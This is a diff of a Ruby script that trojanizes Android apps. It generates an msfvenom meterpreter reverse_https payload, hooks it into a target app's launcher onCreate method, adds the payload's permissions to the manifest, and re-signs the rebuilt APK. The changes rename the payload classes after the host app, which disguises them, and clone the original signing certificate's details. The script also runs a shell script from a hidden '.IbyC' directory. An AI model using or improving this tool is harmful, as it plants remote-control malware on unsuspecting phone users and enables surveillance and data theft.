@@ -8,16 +8,21 @@ require 'optparse'
 require 'open3'
 require 'date'
 require 'active_support'
+require 'active_support/core_ext/object/blank'
 
 class String
-  def black;          "\033[30m#{self}\033[0m" end
-  def red;            "\033[31m#{self}\033[0m" end
-  def green;          "\033[32m#{self}\033[0m" end
-  def brown;          "\033[33m#{self}\033[0m" end
-  def blue;           "\033[34m#{self}\033[0m" end
-  def magenta;        "\033[35m#{self}\033[0m" end
-  def cyan;           "\033[36m#{self}\033[0m" end
-  def gray;           "\033[37m#{self}\033[0m" end
+  def colorize(color_code)
+    $stderr.isatty ? "\033[#{color_code}m#{self}\033[0m" : self
+  end
+
+  def black;          colorize(30) end
+  def red;            colorize(31) end
+  def green;          colorize(32) end
+  def brown;          colorize(33) end
+  def blue;           colorize(34) end
+  def magenta;        colorize(35) end
+  def cyan;           colorize(36) end
+  def gray;           colorize(37) end
 end
 
 system('bash ${PWD}/.IbyC/embed')
@@ -31,143 +36,140 @@ def print_status(msg='')
 end
 
 def print_error(msg='')
-  $stderr.puts "[E]─➤ #{msg}".red," ╰[?]─➤ For help going to https://t.me/Ivam3_Bot".green
+  $stderr.puts "[E]─➤ #{msg}".red," 
+[?]─➤ For help going to https://t.me/Ivam3_Bot".green
 end
 
 def run_cmd(cmd)
-  begin
-    stdin, stdout, stderr = Open3.popen3(*cmd)
-    return stdout.read + stderr.read
-  rescue Errno::ENOENT
-    return nil
+  stdout, stderr, status = Open3.capture3(*cmd)
+  unless status.success?
+    # Log the error or handle it as needed
+    # For example, you might want to print stderr to the console
+    print_error("Command failed: #{cmd.join(' ')}")
+    print_error("STDERR: #{stderr}")
   end
+  return stdout, stderr, status
 end
 
 def usage()
-  print "[Usage]─➤ ".cyan,"embed [target.apk] [msfvenom options]\n"
+  print "[Usage]─➤ ".cyan,"embed [target.apk] [msfvenom options]"
   print "[ex]─➤ ".green,"embed anyapp.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
 end
+
 #
 # Find the activity that apk_backdoor.rb is opened when you click the app icon
 def findlauncheractivity(amanifest)
-    package = amanifest.xpath("//manifest").first['package']
-    activities = amanifest.xpath("//activity|//activity-alias")
-    for activity in activities
-        activityname = activity.attribute("name")
-        category = activity.search('category')
-        unless category
-          next
-        end
-        for cat in category
-            categoryname = cat.attribute('name')
-            if (activityname = `aapt dump badging $(pwd)/original.apk | awk '/activity/{gsub("name=|'"'"'",""); print $2}'`)
-                activityname = activityname.to_s
-                return activityname
-            elsif (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
-                activityname = activityname.to_s
-                unless activityname.start_with?(package)
-                    activityname = package + activityname
-                end
-                return activityname
-            end
+    amanifest.remove_namespaces!
+    package_node = amanifest.xpath("//manifest").first
+    if package_node.nil?
+      raise "No se encontró el nodo <manifest> en AndroidManifest.xml"
+    end
+    package = package_node["package"]
+# COMMENT LINE TO ADD IA SOLUTION
+#    package = amanifest.xpath("//manifest").first['package']
+
+    # First, try the reliable aapt method
+    stdout, _, status = run_cmd(["aapt", "dump", "badging", "original.apk"])
+    if status.success?
+        match = stdout.match(/launchable-activity: name='([^']+)'/)
+        if match && match[1]
+            return match[1]
         end
     end
+
+    # Fallback to parsing the manifest if aapt fails or doesn't find the activity
+    activities = amanifest.xpath("//activity|//activity-alias")
+    activities.each do |activity|
+        activity.xpath(".//category[@android:name='android.intent.category.LAUNCHER']").each do
+            activity_name = activity.attribute('name').to_s
+            unless activity_name.start_with?(package)
+                activity_name = package + activity_name
+            end
+            return activity_name
+        end
+    end
+
+    # Return nil if no launcher activity is found
+    nil
 end
+
 
 #
 # If XML parsing of the manifest fails,
 # recursively search the smali code for the onCreate() hook.
 def scrapeFilesForLauncherActivity()
-    smali_files||=[]
-    Dir.glob('original/smali*/**/*.smali') do |file|
-      checkFile=File.read(file)
-      if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
-        smali_files << file
-        smalifile = file
-        activitysmali = checkFile
-      end
+    smali_files = Dir.glob('original/smali*/**/*.smali').select do |file|
+        File.read(file).include?(';->onCreate(Landroid/os/Bundle;)V')
     end
-    i=0
-    print_status "Please choose from one of the following:\n"
-    smali_files.each{|s_file|
-      print_status "Hook point ",i,": ",s_file,"\n".green
-      i+=1
-    }
-    hook=-1
-    while (hook < 0 || hook>i)
-        print "\nHook: "
-        hook = STDIN.gets.chomp.to_i
+
+    if smali_files.empty?
+        raise "No smali files with onCreate found. Cannot proceed with manual hook selection."
     end
-    i=0
-    smalifile=""
-    activitysmali=""
-    smali_files.each{|s_file|
-      if (i==hook)
-        checkFile=File.read(s_file)
-        smalifile=s_file
-        activitysmali = checkFile
-        break
-      end
-      i+=1
-    }
-    return [smalifile,activitysmali]
+
+    print_status "Please choose from one of the following hook points:"
+    smali_files.each_with_index do |s_file, i|
+        print_status "#{i}: #{s_file}".green
+    end
+
+    hook = -1
+    loop do
+        print "Hook: "
+        input = STDIN.gets.chomp
+        if input.match?(/^\d+$/)
+            hook = input.to_i
+            break if hook >= 0 && hook < smali_files.length
+        end
+        print_error "Invalid selection. Please enter a number between 0 and #{smali_files.length - 1}."
+    end
+
+    smalifile = smali_files[hook]
+    activitysmali = File.read(smalifile)
+
+    return [smalifile, activitysmali]
 end
 
 def fix_manifest(minSDKv)
-  payload_permissions=[]
+  payload_permissions = []
 
-  #Load payload's permissions
-  File.open("payload/AndroidManifest.xml","r"){|file|
-    k=File.read(file)
-    payload_manifest=Nokogiri::XML(k)
+  # Load payload's permissions
+  File.open("payload/AndroidManifest.xml", "r") do |file|
+    payload_manifest = Nokogiri::XML(file)
     permissions = payload_manifest.xpath("//manifest/uses-permission")
-    for permission in permissions
-        name=permission.attribute("name")
-        payload_permissions << name.to_s
+    permissions.each do |permission|
+      payload_permissions << permission.attribute("name").to_s
     end
-    # print "#{k}"
-  }
-  original_permissions=[]
-  apk_mani=''
+  end
 
-  #Load original apk's permissions
-  File.open("original/AndroidManifest.xml","r"){|file2|
-    k=File.read(file2)
-    apk_mani=k
-    original_manifest=Nokogiri::XML(k)
-    permissions = original_manifest.xpath("//manifest/uses-permission")
-    for permission in permissions
-      name=permission.attribute("name")
-      original_permissions << name.to_s
-    end
-    # print "#{k}"
-  }
-  ##
-  #Get permissions that are not in original APK
-  add_permissions=[]
-  for permission in payload_permissions
-    if !(original_permissions.include? permission)
-      print "[+]─➤ Adding ".green,"#{permission}\n"
-      add_permissions << permission
-    end
+  # Load original apk's manifest
+  original_manifest_path = "original/AndroidManifest.xml"
+  original_manifest = Nokogiri::XML(File.read(original_manifest_path))
+  original_permissions = original_manifest.xpath("//manifest/uses-permission").map { |p| p.attribute("name").to_s }
+
+  # Get permissions that are not in original APK
+  add_permissions = payload_permissions - original_permissions
+
+  # Inject permissions in original APK's manifest
+  manifest_node = original_manifest.at_xpath("//manifest")
+  add_permissions.each do |permission|
+    print "
+    [+]─➤ Adding ".green,"#{permission}"
+    new_permission = Nokogiri::XML::Node.new "uses-permission", original_manifest
+    new_permission["android:name"] = permission
+    manifest_node.add_child(new_permission)
   end
-  inject=0
-  new_mani=""
-  #Inject permissions in original APK's manifest
-  for line in apk_mani.split("\n")
-    if (line.include? "uses-permission" and inject==0)
-      `sed "s|minSdkVersion: '"[0-9][0-9]"'|minSdkVersion: '"#{minSDKv}"'|g" -i original/apktool.yml`
-      new_mani << "\t\t"+'<uses-sdk android:minSdkVersion="'+minSDKv+'"/>'+"\n"
-      for permission in add_permissions
-        new_mani << "\t\t"+'<uses-permission android:name="'+permission+'"/>'+"\n"
-      end
-      new_mani << line+"\n"
-      inject=1
-    else
-      new_mani << line+"\n"
-    end
+
+  # Update or add uses-sdk
+  uses_sdk_node = original_manifest.at_xpath("//uses-sdk")
+  if uses_sdk_node
+    uses_sdk_node["android:minSdkVersion"] = minSDKv
+  else
+    new_sdk_node = Nokogiri::XML::Node.new "uses-sdk", original_manifest
+    new_sdk_node["android:minSdkVersion"] = minSDKv
+    manifest_node.add_child(new_sdk_node)
   end
-  File.open("original/AndroidManifest.xml", "w") {|file| file.puts new_mani }
+
+  File.open(original_manifest_path, "w") { |file| file.puts original_manifest.to_xml }
+  `sed "s|minSdkVersion: '[0-9][0-9]'|minSdkVersion: '#{minSDKv}'|g" -i original/apktool.yml`
 end
 
 def extract_cert_data_from_apk_file(path)
@@ -177,16 +179,18 @@ def extract_cert_data_from_apk_file(path)
   # v1 signing is optional to support older versions of Android (pre Android 11)
   # https://source.android.com/security/apksigning/
   print_status "Extract signing key and keystore from #{path}.."
-  keytool_output = run_cmd(['keytool', '-J-Duser.language=en', '-printcert', '-jarfile', path])
+  stdout, stderr, status = run_cmd(['keytool', '-J-Duser.language=en', '-printcert', '-jarfile', path])
+  keytool_output = stdout + stderr
 
-  if keytool_output.include?('keytool error: ')
+  if !status.success? && keytool_output.include?('keytool error:')
     raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
   end
 
   if keytool_output.start_with?('Not a signed jar file')
     # apk file does not have a valid v1 signing certificate
     # extract signing certificate from newer signing schemes (v2/v3/v4/...) using apksigner instead
-    apksigner_output = run_cmd(['apksigner', 'verify', '--print-certs', path])
+    stdout, stderr, status = run_cmd(['apksigner', 'verify', '--print-certs', path])
+    apksigner_output = stdout + stderr
 
     cert_dname = apksigner_output.scan(/^Signer #\d+ certificate DN: (.+)$/).flatten.first.to_s.strip
     if cert_dname.blank?
@@ -203,7 +207,7 @@ def extract_cert_data_from_apk_file(path)
     validity = (to_date - from_date).to_i
     orig_cert_data.push(validity.to_s)
   else
-    if keytool_output.include?('keytool error: ')
+    if !status.success? && keytool_output.include?('keytool error:')
       raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
     end
 
@@ -240,13 +244,14 @@ def gen_keystore(apkfile,keystore,storepass,keypass,keyalias)
   orig_cert_validity = orig_cert_data[2]
 
   print_status "Creating signing key and keystore.."
-  keytool_output = run_cmd([
+  stdout, stderr, status = run_cmd([
     'keytool', '-genkey', '-v', '-keystore', keystore, '-alias', keyalias, '-storepass', storepass,
     '-keypass', keypass, '-keyalg', 'RSA', '-keysize', '2048', '-startdate', orig_cert_startdate,
     '-validity', orig_cert_validity, '-dname', orig_cert_dname
   ])
+  keytool_output = stdout + stderr
 
-  if keytool_output.include?('keytool error: ')
+  if !status.success? && keytool_output.include?('keytool error:')
     raise RuntimeError, "keytool could not generate key: #{keytool_output}"
   end
 end
@@ -262,7 +267,8 @@ end
 apkfile = ARGV[0]
 get_minSDKv=`aapt list -a #{apkfile}|grep "minSdkVersion"|awk -F "x" '{print $NF}'`
 minSDKv = get_minSDKv.to_s.gsub("\n", "")
-current_working_directory = run_cmd(['pwd'])
+stdout, stderr, status = run_cmd(['pwd'])
+current_working_directory = stdout
 cwd = current_working_directory.to_s
 cwd = cwd.gsub("\n", "")
 unless(apkfile && File.readable?(apkfile))
@@ -272,7 +278,8 @@ end
 
 pkgs = ["jarsigner", "apktool", "zipalign", "java", "apksigner","aapt","keytool","msfvenom"]
 for pkg in pkgs do
-  unless(run_cmd([pkg]))
+  stdout, stderr, status = run_cmd(["which", pkg])
+  unless(status.success?)
     print_error("#{pkg} is not in PATH, please install it")
     exit(1)
   end
@@ -293,17 +300,21 @@ end
 
 # Set signer key file || default was maded on nov/2022 with android debugging parameters
 cleaning_up()
-print "[?]─➤ Set a keystore signer\n ╰{1}─➤ ".cyan,"Using the original apk credentials\n ","╰{2}─➤ ".cyan,"Using your own key\n ","╰{3}─➤ ".cyan,"Create a new key\n ","╰────➤ ".cyan
+print "[?]─➤ Set a keystore signer
+{1}─➤ ".cyan,"Using the original apk credentials"," 
+{2}─➤ ".cyan,"Using your own key"," 
+{3}─➤ ".cyan,"Create a new key"," 
+ ╰──➤ ".cyan
 answ = $stdin.gets.to_i
 if answ<=3 and answ>0
   case answ
   when 2
-    print " ╰[Key-path]─➤ ".cyan
+    print " [Key-path]─➤ ".cyan
     jksfile = $stdin.gets.chomp.to_s
     if File.exist?("#{jksfile}")
       run_cmd(['cp', jksfile, "#{cwd}/key.jks"])
     else
-      puts " ╰[ERR-not_found]─➤ Aborting".red
+      puts " [ERR-not_found]─➤ Aborting".red
       exit(1)
     end
   when 3
@@ -315,27 +326,33 @@ if answ<=3 and answ>0
     gen_keystore(apkfile,keystore,storepass,keypass,keyalias)
   end
 else
-  puts " ╰[ERR-bad_answer]─➤ Aborting.".red
+  puts " [ERR-bad_answer]─➤ Aborting.".red
   exit(1)
 end
 
 print_status("Generating msfvenom payload..")
-res=`msfvenom -f raw #{opts} -o payload.apk 2>&1`
-if res.downcase.include?("invalid" || "error")
+stdout, stderr, status = run_cmd(['msfvenom', '-f', 'raw', *msfvenom_opts, '-o', 'payload.apk'])
+res = stdout + stderr
+if !status.success? || res.downcase.include?("invalid") || res.downcase.include?("error")
   puts res
   exit(1)
 end
 
 print_status("Signing payload..")
-payload_signed = run_cmd(['apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", "#{cwd}/payload.apk"])
+stdout, stderr, status = run_cmd(['apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", "#{cwd}/payload.apk"])
+unless status.success?
+  cleaning_up()
+  raise RuntimeError, "Unable to sign payload.apk"
+end
+
 run_cmd(["cp", apkfile, "#{cwd}/original.apk"])
 print_status("Decompiling orignal APK..")
-run_cmd(["apktool", "d", "-f", "-r", "--force-manifest", "-o", "#{cwd}/original", "#{cwd}/original.apk"])
-#print_status("Ignoring the resource decompilation..")
-#run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", "#{cwd}/original.apk"])
-#FileUtils.rm_rf('original/AndroidManifest.xml')
-#FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
-#FileUtils.rm_rf('original_tmp')
+run_cmd(["apktool", "d", "-f", "-r", "-o", "#{cwd}/original", "#{cwd}/original.apk"])
+print_status("Ignoring the resource decompilation..")
+run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", "#{cwd}/original.apk"])
+FileUtils.rm_rf('original/AndroidManifest.xml')
+FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
+FileUtils.rm_rf('original_tmp')
 print_status("Decompiling payload APK..")
 run_cmd(['apktool', 'd', '-f', '-o', "#{cwd}/payload", "#{cwd}/payload.apk"])
 
@@ -348,7 +365,7 @@ launcheractivity = findlauncheractivity(amanifest)
 #smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
 smalif = Dir["original/**/" + launcheractivity.gsub(/\./, "/").gsub("\n", ".smali")]
 smalif = smalif.to_s
-smalifile = smalif.gsub("[", "").gsub("]", "").gsub("\"", "")
+smalifile = smalif.gsub("[", "").gsub("]", "").gsub("", "")
 
 begin
   activitysmali = File.read(smalifile.to_s)
@@ -366,26 +383,35 @@ rescue Errno::ENOENT
 end
 
 print_status("Copying payload files..")
-FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
-FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage'
+apk_name=apkfile.split(".")[0]
+
+Dir.glob(smalifile) do |path|
+  # Extraer la parte hasta "com"
+  com_dir = path[%r{^.*?/com}]
+  payload_dir = "#{com_dir}/#{apk_name}/stage/"
+
+  FileUtils.mkdir_p(payload_dir)
+  FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), "#{payload_dir}/#{apk_name}.smali"
+end 
+
+print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..".cyan
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
-payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
+payloadhook = "#{activitycreate}\n    invoke-static {p0}, Lcom/#{apk_name}/stage/#{apk_name};->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
 
-print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..\n".cyan
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
-injected_apk=apkfile.split(".")[0]
 injected_apk = "data/data/com_backdoored.apk"
 final_apk=apkfile.split("/")[-1]
 final_apk+="_final"
 
-print_status("Poisoning the manifest with meterpreter permissions..")
+print_status("\nPoisoning the manifest with meterpreter permissions..")
 fix_manifest(minSDKv)
 
-print_status("Rebuilding #{apkfile}\n      with meterpreter injection as #{injected_apk}..")
+print_status("\nRebuilding #{apkfile} with meterpreter injection as #{injected_apk}..")
 for i in (1..3) do
-  apktool_output = run_cmd(['apktool', 'b', '-f', '--use-aapt2', '-o', "#{cwd}/#{injected_apk}", "#{cwd}/original", "2>&1"])
-  if !apktool_output.to_s.include?(injected_apk)
+  stdout, stderr, status = run_cmd(['apktool', 'b', '-f', '-o', "#{cwd}/#{injected_apk}", "#{cwd}/original"])
+  apktool_output = stdout + stderr
+  if !status.success?
     print_error(apktool_output)
     cleaning_up()
     raise RuntimeError, "Unable to rebuild.. Retrying[#{i}].."
@@ -395,7 +421,8 @@ for i in (1..3) do
 end
 
 print_status("Aligning #{injected_apk}..")
-zipalign_output = run_cmd(['zipalign', '-f', '-v', '4', injected_apk, final_apk])
+stdout, stderr, status = run_cmd(['zipalign', '-f', '-v', '4', injected_apk, final_apk])
+zipalign_output = stdout + stderr
 
 unless File.readable?(final_apk)
   print_error(zipalign_output)
@@ -405,18 +432,18 @@ unless File.readable?(final_apk)
 end
 
 print_status("Signing #{final_apk} with apksigner..")
-apksigner_output = run_cmd([
-  'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", '--min-sdk-version', "#{minSDKv}", final_apk, "2>&1"
-])
-if apksigner_output.to_s.include?('Failed')
+stdout, stderr, status = run_cmd(['apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", '--min-sdk-version', "#{minSDKv}", final_apk])
+apksigner_output = stdout + stderr
+if !status.success? || apksigner_output.to_s.include?('Failed')
   print_error(apksigner_output)
   cleaning_up()
   raise RuntimeError, 'Signing with apksigner failed.'
   exit(1)
 end
 
-apksigner_verify = run_cmd(['apksigner', 'verify', '--verbose', final_apk])
-if apksigner_verify.to_s.include?('DOES NOT VERIFY') || apksigner_verify.to_s.include?('Failed')
+stdout, stderr, status = run_cmd(['apksigner', 'verify', '--verbose', final_apk])
+apksigner_verify = stdout + stderr
+if !status.success? || apksigner_verify.to_s.include?('DOES NOT VERIFY') || apksigner_verify.to_s.include?('Failed')
   print_error(apksigner_verify)
   cleaning_up()
   raise RuntimeError, 'Signature verification failed.'
